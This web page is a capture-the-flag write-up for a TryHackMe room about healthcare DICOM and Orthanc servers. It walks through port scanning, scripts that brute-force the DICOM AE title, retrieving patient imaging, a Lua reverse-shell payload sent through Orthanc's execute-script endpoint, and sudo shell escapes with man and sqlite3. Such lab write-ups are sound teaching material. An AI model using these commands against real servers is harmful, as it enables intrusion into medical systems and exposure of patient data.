@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+      <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <meta name="google-site-verification" content="HdqGbEoqInZEWXvmPnmKkcqDkxqI6CsY71SwwETWSOI" />
+
+  <title>The Hive - Tryhackme | Thibaut Tauveron</title>
+  <meta name="description" content="Official Writeup for a room I created on tryhackme.com">
+  <meta name="author" content="Thibaut Tauveron"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Thibaut Tauveron",
+    
+    "url": "https:\/\/blog.ttauveron.com"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/blog.ttauveron.com"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/blog.ttauveron.com",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/blog.ttauveron.com\/posts\/tryhackme_thehive\/",
+          "name": "The hive tryhackme"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Thibaut Tauveron"
+  },
+  "headline": "The Hive - Tryhackme",
+  "description" : "If you don\u0026rsquo;t know about tryhackme.com, it\u0026rsquo;s an online platform for learning cyber security hands-on. Multiple \u0026ldquo;rooms\u0026rdquo; are available to get better in cybersecurity. Usually, a room consists in a vulnerable system running in a virtual machine that you can access through a private ip. Your goal is to get flags hidden in the system by discovering and exploiting various vulnerabilities. Users can also propose their own rooms, it makes it quite fun to solve other people challenges and share knowledge!",
+  "inLanguage" : "en",
+  "wordCount":  1291 ,
+  "datePublished" : "2022-08-09T00:00:00",
+  "dateModified" : "2022-08-09T00:00:00",
+  "image" : "https:\/\/blog.ttauveron.com",
+  "keywords" : [ "dicom, orthanc, linux, security, pentest, tryhackme" ],
+  "mainEntityOfPage" : "https:\/\/blog.ttauveron.com\/posts\/tryhackme_thehive\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/blog.ttauveron.com",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/blog.ttauveron.com",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="The Hive - Tryhackme" />
+<meta property="og:description" content="Official Writeup for a room I created on tryhackme.com">
+<meta property="og:image" content="https://i.imgur.com/SIbrgwF.png" />
+<meta name="publish_date" property="og:publish_date" content='2022-08-09T00:00:00Z'>
+
+<meta property="og:url" content="https://blog.ttauveron.com/posts/tryhackme_thehive/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Thibaut Tauveron" />
+
+  <meta name="twitter:title" content="The Hive - Tryhackme" />
+  <meta name="twitter:description" content="Official Writeup for a room I created on tryhackme.com">
+  <meta name="twitter:image" content="https://i.imgur.com/SIbrgwF.png" />
+  <meta name="twitter:card" content="summary" />
+  <link href='https://blog.ttauveron.com/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.88.1" />
+  <link rel="alternate" href="https://blog.ttauveron.com/index.xml" type="application/rss+xml" title="Thibaut Tauveron">
+  <link rel="stylesheet" href="https://blog.ttauveron.com/fontawesome/css/all.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/syntax.css" />
+  <link rel="stylesheet" href="https://blog.ttauveron.com/css/main.css" />
+
+  </head>
+  <body>
+    
+
+<nav>
+  <div class="navbar-custom">
+    <div class="container">
+      <div class="row post-preview">
+        <div class="col-6 d-flex align-items-center me-auto">
+          <a class="header-title" href="https://blog.ttauveron.com">Thibaut Tauveron</a>
+        </div>
+        <div class="col-6 d-flex align-items-end flex-column">
+      <span class="fa-sm">
+        <a href="https://github.com/ttauveron" title="GitHub" class="fa-stack">
+          <div class="fab fa-github fa-stack-1x"></div>
+        </a>
+        <a href="https://linkedin.com/in/ttauveron" title="LinkedIn" class="fa-stack">
+          <div class="fab fa-linkedin fa-stack-1x"></div>
+        </a>
+        <a href="/index.xml" title="RSS" class="fa-stack">
+          <div class="fa fa-rss fa-stack-1x"></div>
+        </a>
+      </span>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</nav>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <article role="main" class="blog-post">
+      <h1>The Hive - Tryhackme</h1>
+      <span class="date">Tuesday, August 9, 2022</span>
+      <p>If you don&rsquo;t know about <a href="https://tryhackme.com/">tryhackme.com</a>, it&rsquo;s an online platform for learning cyber security hands-on.
+Multiple &ldquo;rooms&rdquo; are available to get better in cybersecurity.
+Usually, a room consists in a vulnerable system running in a virtual machine that you can access through a private ip.
+Your goal is to get flags hidden in the system by discovering and exploiting various vulnerabilities.
+Users can also propose their own rooms, it makes it quite fun to solve other people challenges and share knowledge!</p>
+<p>I had already created a room about <a href="https://tryhackme.com/room/palsforlife">exploiting a kubernetes cluster</a> some time ago, but recently I got inspired and created <a href="https://tryhackme.com/room/thehive">a new one about healthcare security</a> - with a nice resident evil theme :-)</p>
+<p>If you&rsquo;re curious about how to solve this challenge, here&rsquo;s a writeup:</p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>To makes things a bit more convenient, edit your <code>/etc/hosts</code> file, adding a <code>hive.thm</code> entry to save your target IP:</p>
+<pre tabindex="0"><code>x.x.x.x   hive.thm
+</code></pre><p>First things first, let&rsquo;s portscan :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nmap -sV -T4 hive.thm -vv
+</code></pre></div><pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-08 01:24 CEST
+NSE: Loaded 5 scripts for scanning.
+Initiating Ping Scan at 01:24
+Scanning hive.thm (x.x.x.x) [2 ports]
+Completed Ping Scan at 01:24, 0.06s elapsed (1 total hosts)
+Initiating Connect Scan at 01:24
+Scanning hive.thm (x.x.x.x) [1000 ports]
+Discovered open port 22/tcp on x.x.x.x
+Discovered open port 80/tcp on x.x.x.x
+Discovered open port 8042/tcp on x.x.x.x
+Discovered open port 4242/tcp on x.x.x.x
+Completed Connect Scan at 01:24, 0.90s elapsed (1000 total ports)
+Initiating Service scan at 01:24
+Scanning 4 services on hive.thm (x.x.x.x)
+Completed Service scan at 01:24, 21.58s elapsed (4 services on 1 host)
+NSE: Script scanning x.x.x.x
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 01:24
+Completed NSE at 01:24, 0.00s elapsed
+Nmap scan report for hive.thm (x.x.x.x)
+Host is up, received syn-ack (0.067s latency).
+Scanned at 2022-08-08 01:24:27 CEST for 23s
+Not shown: 996 closed ports
+Reason: 996 conn-refused
+PORT     STATE SERVICE         REASON  VERSION
+22/tcp   open  ssh             syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http            syn-ack SimpleHTTPServer 0.6 (Python 3.5.2)
+4242/tcp open  vrml-multi-use? syn-ack
+8042/tcp open  nagios-nsca     syn-ack Nagios NSCA
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>On port 80, we get an assignment from the Red queen.</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/ll0V5FumjO4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>(I used <a href="https://kdenlive.org/en/">kdenlive</a> to make this video, took quite some time to learn it but it was a lot of fun 😂)</p>
+<p>It contains a hint to find something that seems to be a password 😈</p>
+<p>Then we get two other ports :</p>
+<ul>
+<li>8042: another webserver</li>
+<li>4242: a tcp endpoint</li>
+</ul>
+<p>Let&rsquo;s learn a bit more about the webserver:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">curl -vvv -L http://hive.thm:8042/
+</code></pre></div><pre tabindex="0"><code>*   Trying x.x.x.x:8042...
+* TCP_NODELAY set
+* Connected to hive.thm (x.x.x.x) port 8042 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: hive.thm:8042
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 401 Unauthorized
+&lt; Connection: keep-alive
+&lt; Keep-Alive: timeout=1
+&lt; WWW-Authenticate: Basic realm=&quot;Orthanc Secure Area&quot;
+&lt; Content-Length: 0
+&lt;
+* Connection #0 to host hive.thm left intact
+</code></pre><p>So it appears to be an <a href="https://book.orthanc-server.com/index.html">Orthanc server</a> protected by HTTP basic auth.</p>
+<p>It probably exposes a port for <a href="https://en.wikipedia.org/wiki/DICOM">DICOM</a>.</p>
+<p>The following nmap script can help us learn more about it: <a href="https://nmap.org/nsedoc/scripts/dicom-ping.html">https://nmap.org/nsedoc/scripts/dicom-ping.html</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nmap --script<span class="o">=</span>dicom-ping -T4 hive.thm -vv
+</code></pre></div><pre tabindex="0"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-08 01:51 CEST
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 01:51
+Completed NSE at 01:51, 0.00s elapsed
+Initiating Ping Scan at 01:51
+Scanning hive.thm (x.x.x.x) [2 ports]
+Completed Ping Scan at 01:51, 0.06s elapsed (1 total hosts)
+Initiating Connect Scan at 01:51
+Scanning hive.thm (x.x.x.x) [1000 ports]
+Discovered open port 80/tcp on x.x.x.x
+Discovered open port 22/tcp on x.x.x.x
+Discovered open port 8042/tcp on x.x.x.x
+Discovered open port 4242/tcp on x.x.x.x
+Completed Connect Scan at 01:51, 0.99s elapsed (1000 total ports)
+NSE: Script scanning 10.10.99.46.
+NSE: Starting runlevel 1 (of 1) scan.
+Initiating NSE at 01:51
+Completed NSE at 01:51, 0.12s elapsed
+Nmap scan report for hive.thm (x.x.x.x)
+Host is up, received syn-ack (0.075s latency).
+Scanned at 2022-08-08 01:51:27 CEST for 1s
+Not shown: 996 closed ports
+Reason: 996 conn-refused
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack
+80/tcp   open  http     syn-ack
+4242/tcp open  dicom    syn-ack
+| dicom-ping:
+|   dicom: DICOM Service Provider discovered!
+|_  config: Called AET check enabled
+8042/tcp open  fs-agent syn-ack
+</code></pre><p>So port 4242 is indeed a DICOM endpoint.</p>
+<p>We can also try to probe it using <a href="https://dicom.offis.de/dcmtk">dcmtk</a>, it&rsquo;s a toolkit that contains many programs to work with DICOM, including the following echoscu.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">echoscu hive.thm <span class="m">4242</span>
+</code></pre></div><pre tabindex="0"><code>F: Association Rejected:
+F: Result: Rejected Permanent, Source: Service User
+F: Reason: Called AE Title Not Recognized
+</code></pre><h1 id="bruteforcing">Bruteforcing</h1>
+<p>Both <code>nmap</code> and <code>echoscu</code> show that there is a check on the Called AET and we don&rsquo;t know it.
+So&hellip; let&rsquo;s try to bruteforce it!</p>
+<p>nmap proposes a <a href="https://nmap.org/nsedoc/scripts/dicom-brute.html">script</a> to bruteforce an AET but it was so slow for me that I decided to write my own program.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="k">while</span> <span class="nb">read</span> p<span class="p">;</span> <span class="k">do</span>
+    echoscu -aec <span class="nv">$p</span> hive.thm <span class="m">4242</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> -eq <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+        <span class="nb">echo</span> AET FOUND <span class="nv">$p</span>
+        <span class="nb">break</span>
+    <span class="k">else</span>
+        <span class="nb">echo</span> invalid aet <span class="nv">$p</span>
+    <span class="k">fi</span>
+<span class="k">done</span> &lt; wordlists/rockyou.txt
+</code></pre></div><p>Or if you prefer using python:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pynetdicom</span> <span class="kn">import</span> <span class="n">AE</span>
+<span class="kn">from</span> <span class="nn">pynetdicom.sop_class</span> <span class="kn">import</span> <span class="n">Verification</span>
+
+<span class="n">ae</span> <span class="o">=</span> <span class="n">AE</span><span class="p">(</span><span class="n">ae_title</span><span class="o">=</span><span class="s1">&#39;local&#39;</span><span class="p">)</span>
+<span class="n">ae</span><span class="o">.</span><span class="n">add_requested_context</span><span class="p">(</span><span class="n">Verification</span><span class="p">)</span>
+
+<span class="n">orthanc_host</span> <span class="o">=</span> <span class="s2">&#34;hive.thm&#34;</span>
+<span class="n">orthanc_port</span> <span class="o">=</span> <span class="mi">4242</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;wordlists/rockyou.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">wordlist</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="n">assoc</span> <span class="o">=</span> <span class="n">ae</span><span class="o">.</span><span class="n">associate</span><span class="p">(</span><span class="n">orthanc_host</span><span class="p">,</span> <span class="n">orthanc_port</span><span class="p">,</span> <span class="n">ae_title</span><span class="o">=</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+        <span class="k">if</span> <span class="n">assoc</span><span class="o">.</span><span class="n">is_established</span><span class="p">:</span>
+            <span class="n">assoc</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;AET FOUND: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Invalid AET: </span><span class="si">{</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</code></pre></div><p>Using the <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou wordlist</a>, we manage to find the AET pretty quickly.</p>
+<h1 id="using-dicom">Using DICOM</h1>
+<p>Now that we know the called AET, we can start interacting with the DICOM server.</p>
+<p><code>findscu</code> and <code>getscu</code> from dcmtk can be used to do it, first by listing patients and then by downloading a patient&rsquo;s study.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">findscu -aec shadow -P -k <span class="s2">&#34;0008,0052=PATIENT&#34;</span>  -k <span class="s2">&#34;0010,0020=&#34;</span> hive.thm <span class="m">4242</span>
+getscu -aec shadow -k <span class="s2">&#34;0008,0052=PATIENT&#34;</span> -k <span class="s2">&#34;0010,0020=MARCUS&#34;</span> hive.thm <span class="m">4242</span>
+</code></pre></div><p>But I think it&rsquo;s much easier to do it with <a href="https://nroduit.github.io/en/">weasis</a>.</p>
+<p>In weasis, configure a DICOM node with the AE title found earlier:
+<figure><img src="https://i.imgur.com/wV4BDO5.png" width="100%"/>
+</figure>
+</p>
+<p>Then search and import studies from the PACS in &ldquo;DICOM Query/Retrieve&rdquo;:
+<figure><img src="https://i.imgur.com/lkQFAHj.png" width="100%"/>
+</figure>
+</p>
+<p>We can now look at the study, slices of a human skull. In one of the last slices, a password is visible.</p>
+<p>(blurred here)
+<figure><img src="https://i.imgur.com/ORnXh3M.png" width="100%"/>
+</figure>
+</p>
+<p>We can now log into orthanc using marcus account with the password we just found!</p>
+<h1 id="remote-code-execution">Remote code execution</h1>
+<p>Orthanc exposes a REST API that has a very <a href="https://api.orthanc-server.com/#tag/System/paths/~1tools~1execute-script/post">insteresting endpoint</a>.</p>
+<p>Let&rsquo;s try to get a shell.</p>
+<p>Locally, run <code>nc -l -p 4242</code> to listen for TCP traffic.</p>
+<p>And send our reverse shell payload through the execute-script endpoint.</p>
+<p>payload.lua:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="kd">local</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">io.popen</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_LOCAL_IP 4242 &gt;/tmp/f&#34;</span><span class="p">)</span>
+<span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">handle</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;*a&#34;</span><span class="p">)</span>
+<span class="n">handle</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+<span class="n">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">curl -u marcus:xxxxxxxx http://hive.thm:8042/tools/execute-script -X POST -d @payload.lua
+</code></pre></div><p>And it worked, we have a shell!</p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>First, let&rsquo;s stabilize the shell:</p>
+<pre tabindex="0"><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+</code></pre><p>Who are we?</p>
+<pre tabindex="0"><code>marcus@hive:/$ whoami
+whoami
+marcus
+</code></pre><p>Looking into marcus home directory, we find the first flag!</p>
+<p>What can we do?</p>
+<pre tabindex="0"><code>marcus@hive:/$ sudo -l
+sudo -l
+Matching Defaults entries for marcus on hive.thm:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marcus may run the following commands on hive.thm:
+    (isaacs) NOPASSWD: /usr/bin/man
+</code></pre><p>So we can execute the manual as another user and inside the manual we can get another shell:</p>
+<pre tabindex="0"><code>$ sudo -u isaacs /usr/bin/man man
+!/bin/sh
+</code></pre><p>Did it work?</p>
+<pre tabindex="0"><code>$ whoami
+whoami
+isaacs
+</code></pre><p>It did!</p>
+<p>What can we do now?</p>
+<pre tabindex="0"><code>$ sudo -l
+sudo -l
+Matching Defaults entries for isaacs on hive.thm:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User isaacs may run the following commands on hive.thm:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/sqlite3
+</code></pre><p>Executing sqlite3 as root.
+Let&rsquo;s get another (again!) shell:</p>
+<pre tabindex="0"><code>sudo sqlite3 /dev/null '.shell /bin/sh'
+</code></pre><pre tabindex="0"><code># whoami
+whoami
+root
+</code></pre><p>And we&rsquo;re root, final flag is in root&rsquo;s home directory.</p>
+<p>That&rsquo;s it!
+I hope you enjoyed the challenge and that DICOM hasn&rsquo;t been too painful if you just learnt about it!</p>
+
+      
+      <div class="blog-tags">
+        
+        <a href="https://blog.ttauveron.com/tags/dicom/">dicom</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/orthanc/">orthanc</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/linux/">linux</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/security/">security</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/pentest/">pentest</a>&nbsp;
+        
+        <a href="https://blog.ttauveron.com/tags/tryhackme/">tryhackme</a>&nbsp;
+        
+      </div>
+      
+    </article>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="d-flex justify-content-center">
+        <p class="credits copyright text-muted">
+          Thibaut Tauveron
+          &nbsp;&bull;&nbsp;&copy;
+            2022
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+  </body>
+</html>
+
